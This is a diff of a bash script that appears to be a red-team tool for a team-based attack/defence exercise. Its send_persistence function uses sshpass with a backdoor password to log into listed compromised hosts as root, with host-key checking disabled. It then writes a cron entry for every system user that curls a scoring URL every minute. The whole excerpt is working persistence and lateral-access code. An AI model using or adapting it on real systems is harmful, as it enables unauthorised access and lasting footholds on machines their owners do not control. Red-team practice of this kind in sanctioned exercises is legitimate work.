@@ -33,22 +33,26 @@ send_backdoor() {
 send_persistence() {
     read -p "Team to Send Persistence to: " team_number
     read -p "Backdoor Password: " backdoor_password
+    
     count=0
-
     while IFS= read -r IP; do
         team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)
 
         if [[ "$team_number_from_IP" == "$team_number" ]]; then
-            for admin in "${admins[@]}"; do
-                sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
-                    echo \"$backdoor_password\" | sudo -S (crontab -l; echo "* * * * * curl $scoring_link") | crontab -
-                "
+            sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "root@$IP" "
+                echo \"$backdoor_password\" | sudo -S bash -c '
+                    users=\$(cut -d: -f1 /etc/passwd)
 
-                if [[ $? -eq 0 ]]; then
-                    count=$((count + 1))
-                    break
-                fi
-            done
+                    for user in \$users; do
+                        echo \"\$backdoor_password\" | sudo -S bash -c \"(crontab -u \$user -l; echo \"* * * * * curl $scoring_link\") | crontab -u \$user -\"
+                    done
+                '
+            "
+
+            if [[ $? -eq 0 ]]; then
+                count=$((count + 1))
+                break
+            fi
         fi
     done < backdoored_IPs.txt
 
